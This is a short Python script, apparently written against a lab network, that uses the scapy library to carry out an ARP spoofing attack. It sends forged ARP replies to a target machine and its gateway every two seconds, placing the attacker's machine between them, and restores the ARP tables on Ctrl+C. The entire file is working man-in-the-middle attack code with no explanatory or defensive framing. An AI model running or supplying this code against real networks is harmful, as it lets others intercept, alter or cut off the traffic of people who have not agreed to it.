#!/usr/bin/env python
import time
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.56.137"
gateway_ip = "192.168.56.2"

try:
    sent_packet_count = 0
    while True:
        spoof("192.168.56.137", "192.168.56.2")
        spoof("192.168.56.2", "192.168.56.137")
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packets sent " + str(sent_packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CRTL + C ......Resetting ARP tables.....Please wait.")
    restore("192.168.56.137", "192.168.56.2")

